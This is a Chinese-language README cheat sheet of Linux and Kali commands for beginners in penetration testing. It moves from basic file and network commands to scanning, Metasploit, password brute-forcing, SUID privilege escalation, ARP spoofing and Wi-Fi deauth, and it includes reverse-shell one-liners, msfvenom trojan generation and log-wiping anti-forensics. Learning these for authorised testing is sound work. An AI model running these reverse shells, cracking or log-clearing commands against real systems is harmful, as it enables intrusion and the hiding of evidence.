# CC BY-NC-SA 4.0 许可声明

本作品采用 **知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议**（Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License）进行许可。

您可以自由地：
- **分享** — 在任何媒介以任何形式复制、发行本作品
- **演绎** — 修改、转换或以本作品为基础进行创作

惟须遵守下列条件：
- **署名** — 您必须给出适当的署名，提供指向本许可协议的链接，同时标明是否（对原始作品）作了修改。您可以用任何合理的方式来署名，但是不得以任何方式暗示许可人为您或您的使用背书。
- **非商业性使用** — 您不得将本作品用于商业目的。
- **相同方式共享** — 如果您再混合、转换或者基于本作品创作，您必须基于与原先许可协议相同的许可协议分发您演绎的作品。

完整许可协议文本请访问：https://creativecommons.org/licenses/by-nc-sa/4.0/legalcode.zh-Hans

English version: https://creativecommons.org/licenses/by-nc-sa/4.0/

Copyright (c) 2026 [Axing-xiao]

# linux-kali-cheatsheet
Linux/Kali 常用命令速查表 - 适合安全行业初学者学习渗透测试与系统运维

# Linux / Kali 常用指令速查表（2026 版）

面向 Linux 初学者 & 渗透测试入门者的实用命令手册  
涵盖基础操作 → 网络 → 信息收集 → 扫描 → 漏洞利用 → 密码破解 → 提权 → 嗅探 → 无线 → 反弹 shell 等高频场景

**⚠️ 重要免责声明**  
本清单仅供**学习**和**合法授权的安全测试/红蓝对抗演练**使用，严禁用于任何非法目的。  
强烈建议在**虚拟机**（VirtualBox / VMware）中练习，危险命令执行前务必三思！

**新手快速上手建议**  
1. 不确定命令用法 → 输入 `命令 --help` 或 `man 命令` 查看帮助  
2. 网卡名称不确定 → 先运行 `ip link` 或 `nmcli device` 查看真实名称  
3. 优先掌握一～四部分，再逐步学习后面章节

---

## 一、基础系统/目录操作

1. `ls` —— 列出当前目录文件/文件夹  
2. `ls -l` —— 详细列出文件属性（权限、大小、修改时间）  
3. `ls -a` —— 显示隐藏文件（包含 `.` 和 `..`）  
4. `ls -la` —— 详细显示所有文件（含隐藏）  
5. `cd /` —— 切换到根目录  
6. `cd ..` —— 切换到上一级目录  
7. `cd ~` 或 `cd` —— 切换到当前用户主目录  
8. `cd -` —— 切换到上一次操作的目录  
9. `pwd` —— 查看当前所在绝对路径  
10. `mkdir test` —— 创建名为 `test` 的文件夹  
11. `mkdir -p /a/b/c` —— 递归创建多级目录  
12. `rm file` —— 删除单个文件  
13. `rm -f file` —— 强制删除文件（不提示）  
14. `rm -r dir` —— 递归删除文件夹及内部内容  
    **⚠️ 这是 Linux 最危险的命令之一！**  
    误操作示例：`rm -rf /` 或 `rm -rf /*` 会瞬间清空整个系统。  
    **永远**先用 `ls` 确认路径，再执行带 `-r` 或 `-rf` 的删除。  
15. `rm -rf dir` —— 强制递归删除（**高危**，谨慎使用）  
16. `cp file /tmp/` —— 复制文件到指定目录  
17. `cp -r dir /tmp/` —— 递归复制文件夹  
18. `mv file /tmp/` —— 移动文件到指定目录（也可用于重命名）  
19. `mv oldname newname` —— 给文件/文件夹重命名  
20. `touch newfile` —— 创建空文件  
21. `chmod 777 file` —— 赋予所有用户读写执行权限  
    **⚠️ 极度危险**，生产环境几乎从不使用 777！  
    常见安全组合：  
    - 文件：`chmod 644`（拥有者读写，其他人只读）  
    - 目录/可执行脚本：`chmod 755`（拥有者全权，其他人读+执行）  
22. `chmod 755 file` —— 所有者读写执行，其他用户读执行  
23. `chown root:root file` —— 修改文件所属用户和组为 root  
24. `df -h` —— 查看磁盘空间（人性化显示）  
25. `free -h` —— 查看内存/交换分区使用情况  

---

## 二、文件编辑/查看操作

1. `cat file` —— 正序查看文件全部内容  
2. `tac file` —— 倒序查看文件全部内容  
3. `head file` —— 查看前 10 行  
4. `head -n 20 file` —— 查看前 20 行  
5. `tail file` —— 查看后 10 行  
6. `tail -n 20 file` —— 查看后 20 行  
7. `tail -f file` —— 实时监控文件变化（日志分析最常用）  
8. `more file` —— 分页查看（空格/回车翻页）  
9. `less file` —— 高级分页查看（支持上下翻页、/ 搜索）  
10. `nano file` —— 简易文本编辑器  
11. `vim file` —— 高级编辑器（按 i 编辑，Esc 退出编辑，`:wq` 保存退出，`:q!` 强制退出）  
12. `grep "keyword" file` —— 在文件中搜索关键词  
13. `grep -i "keyword" file` —— 忽略大小写搜索  
14. `grep -r "keyword" dir` —— 递归搜索整个目录  
15. `wc -l file` —— 统计文件行数  

---

## 三、网络基础操作

1. `ifconfig` —— 查看/配置网络接口（**旧命令**）  
2. `ip a` 或 `ip addr` —— 现代推荐命令，查看网络接口详情  
3. `ip addr add 192.168.1.100/24 dev eth0` —— 临时添加 IP（**重启丢失**）  
   **网卡名说明**：eth0 仅为示例，现代系统常见 ens33 / enp0s3 / wlan0 等，用 `ip link` 查看真实名称。很多工具支持 `-i any`（所有接口）。  
   永久配置建议用 `nmcli` 或 Netplan。  
4. `route -n` —— 查看路由表  
5. `ip route` —— 现代路由查看/配置命令  
6. `ping ip` —— 测试连通性（默认无限发送，按 Ctrl+C 停止）  
7. `ping -c 4 ip` —— 发送 4 个包后停止  
8. `ping -i 0.5 ip` —— 每 0.5 秒发一个包（快速探测）  
9. `netstat -tulnp` —— 查看监听端口及进程（**过时**，推荐 ss）  
10. `netstat -an` —— 查看所有连接（**过时**）  
11. `ss -tulnp` —— 现代首选，快速查看监听端口  
    **口诀**：新系统一律用 ss！  
12. `arp -a` —— 查看 ARP 缓存表  
13. `arp -s ip mac` —— 静态绑定 IP 和 MAC  
14. `hostname` —— 查看主机名  
15. `hostname newname` —— 临时修改主机名  
16. `curl url` —— 访问 URL 并显示内容  
17. `wget url` —— 下载文件到当前目录  
18. `wget -O newname url` —— 下载并自定义文件名  
19. `curl ifconfig.me` —— 查看本机公网 IP（备选：`curl icanhazip.com` 或 `curl ip.sb`）  
20. `telnet ip port` —— 测试指定端口是否开放  

---

## 四、信息收集命令

1. `uname -a` —— 查看内核版本、系统架构、主机名等  
2. `cat /etc/issue` —— 查看系统发行版简要信息  
3. `cat /etc/os-release` —— 详细查看系统版本信息（推荐）  
4. `whoami` —— 查看当前登录用户名  
5. `who` —— 查看当前所有登录系统的用户  
6. `w` —— 查看当前登录用户及正在执行的操作  
7. `last` —— 查看系统登录历史记录  
8. `ps -ef` —— 查看所有运行的进程（详细信息）  
9. `ps aux` —— 以 BSD 格式查看所有进程  
10. `top` —— 实时监控系统进程（资源占用、PID 等，按 q 退出）  
11. `pstree` —— 以树形结构查看进程关系  
12. `netstat -antp` —— 查看所有 TCP 连接及对应进程（过时，建议用 ss）  
13. `find / -name "*.sh"` —— 从根目录搜索所有 .sh 后缀的文件  
    **提示**：从根目录搜索很慢，建议指定路径如 `find /home -name ...`  
14. `find / -perm -4000 -type f 2>/dev/null` —— 搜索 SUID 权限文件（常用于提权线索）  
15. `arp-scan -l` 或 `arp-scan --localnet` —— 扫描局域网存活主机（Kali 常用）  
16. `fping -g 192.168.1.0/24` —— 快速扫描 C 段存活主机  
17. `cat /etc/passwd` —— 查看系统所有用户信息  
18. `cat /etc/group` —— 查看系统所有用户组信息  
19. `cat /var/log/auth.log` —— 查看系统认证日志（登录、sudo 操作等）  
20. `lsof -i:80` —— 查看占用 80 端口的进程  

---

## 五、端口/网段扫描命令

1. `nmap ip` —— 默认扫描目标（1000 个常用端口）  
2. `nmap -sn 192.168.1.0/24` —— 仅扫描网段存活主机（无端口扫描）  
3. `nmap -p 80 ip` —— 仅扫描 80 端口  
4. `nmap -p 1-65535 ip` —— 扫描所有端口  
5. `nmap -p 80,443,22 ip` —— 扫描指定多个端口  
6. `nmap -sT ip` —— TCP 全连接扫描（易被检测）  
7. `nmap -sS ip` —— TCP SYN 半开放扫描（隐蔽，默认推荐）  
   **区别**：-sS 只发 SYN，不完成握手，不易被记录；-sT 完整握手，像正常访问。  
8. `nmap -sU ip` —— UDP 端口扫描  
9. `nmap -sV ip` —— 扫描端口并探测服务版本信息  
10. `nmap -O ip` —— 探测目标操作系统类型（大写 O）  
11. `nmap -A ip` —— 全面扫描（存活+端口+版本+OS+脚本）  
12. `nmap -T4 ip` —— 提高扫描速度（-T0 最慢，-T5 最快）  
13. `nmap -oN result.txt ip` —— 保存为普通文本  
14. `nmap -oX result.xml ip` —— 保存为 XML 格式  
15. `nmap --script=vuln ip` —— 加载漏洞脚本探测已知漏洞  
    **2026 年提示**：nmap 脚本引擎更新频繁，vuln 脚本 false positive 较多，建议结合 -sV 使用。  
16. `nmap --script=brute ip` —— 加载暴力破解脚本（弱口令尝试）  
17. `nmap -Pn ip` —— 跳过主机存活检测，直接扫端口（目标禁 ping 时必加）  
18. `nmap -D RND:10 ip` —— 使用随机 10 个假 IP 欺骗源地址（隐藏真实 IP）  
19. `masscan 192.168.1.0/24 -p 80,443` —— 超高速端口扫描（比 nmap 快得多）  
20. `zenmap` —— 打开 Nmap 图形化界面（适合新手）  

---

## 六、漏洞探测/利用基础（Metasploit 示例）

1. `msfconsole` 或 `msfconsole -q` —— 打开 Metasploit 控制台（-q 安静模式推荐）  
2. `search ms17-010` —— 搜索指定漏洞模块  
3. `use exploit/windows/smb/ms17_010_eternalblue` —— 加载漏洞利用模块  
4. `show options` —— 查看模块所需参数  
5. `set RHOSTS ip` —— 设置目标 IP  
6. `set LHOST ip` —— 设置本机攻击 IP（反弹 shell 用）  
7. `set LPORT 4444` —— 设置监听端口  
8. `exploit` 或 `run` —— 执行漏洞利用  
9. `back` —— 退出当前模块  
10. `sessions -l` —— 查看所有反弹 shell 会话  
11. `sessions -i 1` —— 进入编号 1 的 shell 会话  
12. `sessions -k 1` —— 关闭编号 1 的会话  
13. `nessusd start` —— 启动 Nessus 服务（旧写法）  
14. `nessuscli scan --launch 123` —— 启动指定 Nessus 扫描任务  
    **注意**：Nessus 新版本多用 systemctl 管理或 web 界面操作。

---

## 七、密码破解命令

1. `hydra -l root -P pass.txt ssh://ip` —— 破解 SSH（用户名 + 密码字典）  
   **提示**：在线暴力易被封 IP，可加 `-t 4` 限制线程。  
2. `hydra -L user.txt -P pass.txt rdp://ip` —— 破解 RDP  
3. `hydra -l admin -P pass.txt http-get://ip` —— 破解 HTTP GET 登录  
4. `hydra -l admin -P pass.txt mysql://ip` —— 破解 MySQL  
5. `john --wordlist=pass.txt passwd` —— John the Ripper 破解系统密码文件  
6. `john --show passwd` —— 查看已破解密码  
7. `hashcat -m 0 hash.txt pass.txt` —— Hashcat 破解 MD5  
8. `hashcat -m 1000 hash.txt pass.txt` —— 破解 NTLM  
9. `crunch 6 8 0123456789 -o 6-8num.txt` —— 生成 6-8 位纯数字字典  
10. `crunch 8 8 abc123 -o 8char.txt` —— 生成 8 位字母+数字字典  
11. `cewl url -w webpass.txt` —— 从网站爬取内容生成专属字典  
12. `medusa -u root -P pass.txt -h ip -M ssh` —— 美杜莎破解 SSH（速度快）  
13. `sqlmap -u url --forms` —— 检测 SQL 注入并尝试破解数据库  
14. `fcrackzip -D -p pass.txt test.zip` —— 破解 ZIP 压缩包  
15. `7z x test.zip -p123456` —— 用已知密码解压加密 ZIP  

---

## 八、提权/本地渗透命令

1. `sudo -l` —— 查看当前用户可用的 sudo 命令（提权核心）  
2. `sudo su` —— 以 root 权限切换用户  
3. `su root` —— 切换到 root（需 root 密码）  
4. `id` —— 查看当前用户 UID、GID、组信息  
5. `find / -type f -perm -4000 2>/dev/null` —— 搜索 SUID 文件  
   **常见可利用**：find、vim、nano、less、more、cp 等（视系统版本而定）  
6. `find / -type f -perm -2000 2>/dev/null` —— 搜索 SGID 文件  
7. `chkrootkit` —— 检测 rootkit 后门  
8. `rkhunter --check` —— 高级 rootkit 检测  
9. `unshare -rm /bin/bash` —— 利用内核漏洞临时提权（老漏洞，成功率低）  
10. `cp /bin/bash /tmp/bash; chmod 4755 /tmp/bash` —— 制作 SUID bash  
11. `./tmp/bash -p` —— 执行 SUID bash 提权  
    **现代防护**：很多系统有 no-new-privs 等机制，成功率大幅下降，仅学习参考。  
12. `ps aux | grep root` —— 查看 root 进程（寻找提权突破口）  
13. `cat /proc/cmdline` —— 查看启动参数（找提权线索）  
14. `lsmod` —— 查看加载的内核模块  
15. `exploit-db` —— 打开 Exploit-DB 漏洞库（Kali 内置）

---

## 九、嗅探抓包/流量分析

1. `tcpdump -i any` —— 在所有接口抓包（推荐 any 而非 eth0）  
2. `tcpdump -i any -w cap.pcap` —— 抓包保存为 pcap 文件  
3. `tcpdump -i any port 80` —— 仅抓 80 端口流量  
4. `wireshark` —— 打开图形化抓包工具  
5. `tshark -i any` —— Wireshark 命令行版  
6. `arpspoof -i any -t 192.168.1.100 192.168.1.1` —— ARP 欺骗  
   **2026 年推荐**：bettercap（功能更全，支持 HTTPS/DNS 等中间人攻击）  
7. `driftnet -i any` —— 嗅探局域网图片流量  
8. `urlsnarf -i any` —— 嗅探 URL 访问记录  
9. `dsniff -i any` —— 综合嗅探（捕获 FTP/HTTP/SMB 凭证）  
10. `ngrep -d any "password"` —— 过滤包含关键词的网络流  

---

## 十、无线渗透命令

1. `airmon-ng start wlan0` —— 开启监听模式（网卡变为 wlan0mon）  
2. `airmon-ng stop wlan0mon` —— 关闭监听模式  
3. `airodump-ng wlan0mon` —— 扫描周围 WiFi  
4. `airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w wifi wlan0mon` —— 定向抓包  
5. `aireplay-ng --deauth 0 -a XX:XX:XX:XX:XX:XX wlan0mon` —— 无限 deauth 断网攻击  
6. `aircrack-ng -w pass.txt wifi-01.cap` —— 字典破解 WPA/WPA2  
7. `reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX -vV` —— 破解 WPS  
8. `wash -i wlan0mon` —— 扫描开启 WPS 的设备  
9. `kismet` —— 无线流量嗅探/扫描（图形化）  
10. `bully -i wlan0mon -b XX:XX:XX:XX:XX:XX` —— WPS 破解（成功率较高）  
    **提示**：运行前常需 `airmon-ng check kill` 杀干扰进程

---

## 十一、远程连接/木马上线

1. `ssh root@ip` —— SSH 连接目标  
2. `ssh -p 2222 root@ip` —— 连接非 22 端口  
3. `scp file root@ip:/tmp/` —— 上传文件  
4. `scp root@ip:/tmp/file ./` —— 下载文件  
5. `nc -lvnp 4444` —— 本机开启监听（-l 小写 L）  
6. **反弹 shell（Linux）**  
   旧方式（-e 已废弃）：`nc ip 4444 -e /bin/bash`  
   推荐方式（兼容大多数现代 netcat）：
   ```bash
   rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 你的IP 4444 >/tmp/f
	如果目标是 ncat（非 Kali 默认），可使用 -e 或：
   ncat -l -p 4444 --sh-exec /bin/bash
7.反弹 shell（Windows）：nc ip 4444 -e cmd.exe
8.msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=你的IP LPORT=4444 -f elf > shell.elf —— 生成 Linux 木马
9.msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的IP LPORT=4444 -f exe > shell.exe —— 生成 Windows 木马
10.chmod +x shell.elf; ./shell.elf —— 执行 Linux 木马

---

##十二、逆向分析/恶意代码检测

1.objdump -d file.elf —— 反汇编 ELF 文件
2.readelf -a file.elf —— 查看 ELF 文件详细信息
3ida64 —— 打开 IDA Pro 64 位（高阶逆向工具）
4.radare2 file.elf —— 命令行逆向工具（轻量替代 IDA）
5.strings file.exe —— 提取文件中的明文字符串

---

##十三、清理痕迹/反取证
1.history -c —— 清空当前命令历史
2.rm ~/.bash_history —— 删除历史记录文件
3.: > /var/log/auth.log 或 truncate -s 0 /var/log/auth.log —— 清空认证日志（推荐）
4.: > /var/log/syslog —— 清空系统日志
注意：清日志后系统仍会继续写新日志；真正反取证需结合其他手段。
5.touch -t YYYYMMDDHHMM file 或 touch -d "2024-01-01 00:00" file —— 修改文件时间戳

---
##十四、杂项渗透高频命令
1.chmod +x file —— 添加执行权限
2../file —— 运行当前目录可执行文件
3.nc -zv ip 1-1000 —— 快速扫描端口（推荐 nmap 替代）
4.sqlmap -u "http://target.com?id=1" --dump —— SQL 注入检测 & 数据导出
5.dirb http://target.com —— 目录爆破（较老）
6.dirsearch -u http://target.com -e php,html —— 高级目录爆破
7.gobuster dir -u http://target.com -w wordlist.txt —— 高性能目录爆破（目前主流）
8.whatweb url —— 探测网站技术栈
9.nikto -h ip —— 扫描 Web 服务器漏洞
10.metasploit-framework —— 直接启动 Metasploit
11.xterm —— 打开新终端窗口
12.screen —— 创建后台会话（断开后进程继续运行）
13.screen -r —— 恢复 screen 会话
14.reboot —— 重启系统
15.shutdown -h now —— 立即关机

最后提醒
这份速查表会随着工具更新而变化，建议定期查看 Kali 官网或工具的 --help。
祝学习愉快，合法、安全地探索 Linux 与网络安全世界！
Star & Fork 欢迎～